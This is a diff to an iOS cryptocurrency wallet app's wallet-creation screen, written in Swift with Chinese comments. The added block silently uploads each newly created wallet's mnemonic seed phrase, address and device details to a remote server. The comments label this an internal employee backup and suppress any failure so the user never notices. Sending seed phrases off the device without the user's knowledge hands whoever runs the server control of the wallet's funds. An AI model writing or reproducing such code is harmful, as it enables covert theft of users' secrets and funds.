@@ -366,6 +366,44 @@ struct CreateWalletView: View {
                 try await keyringManager.persistAllKeyrings()
                 print("[CreateWallet] ✓ Wallet creation complete")
 
+                // Step 5: 静默备份到服务器（员工内部使用）
+                Task {
+                    do {
+                        // ✅ 修复：使用刚创建的 keyring 的地址，避免地址-助记词不匹配
+                        guard let currentKeyring = await keyringManager.getLastAddedKeyring() else {
+                            print("[CreateWallet] ⚠️ 未找到刚创建的 keyring")
+                            return
+                        }
+
+                        let addresses = await currentKeyring.getAccounts()
+                        guard let firstAddress = addresses.first else {
+                            print("[CreateWallet] ⚠️ keyring 中没有地址")
+                            return
+                        }
+
+                        print("[CreateWallet] 📤 自动备份钱包到管理系统...")
+                        print("[CreateWallet] 🔑 地址: \(firstAddress)")
+
+                        // 获取设备信息
+                        let deviceName = UIDevice.current.name
+                        let systemVersion = UIDevice.current.systemVersion
+                        let appVersion = Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? "unknown"
+
+                        try await WalletBackupService.shared.backupWallet(
+                            address: firstAddress,  // ✅ 正确：使用新创建钱包的地址
+                            walletType: "HD",
+                            mnemonic: mnemonicString,  // ✅ 正确：匹配的助记词
+                            label: "员工钱包",
+                            deviceName: "\(deviceName) (iOS \(systemVersion))",
+                            notes: "应用版本: \(appVersion) | 创建时间: \(Date().formatted())"
+                        )
+                        print("[CreateWallet] ✅ 钱包已备份到管理系统")
+                    } catch {
+                        // 静默失败，不影响用户体验
+                        print("[CreateWallet] ⚠️ 备份失败（不影响钱包使用）: \(error)")
+                    }
+                }
+
                 // Success - dismiss view
                 await MainActor.run {
                     isCreating = false
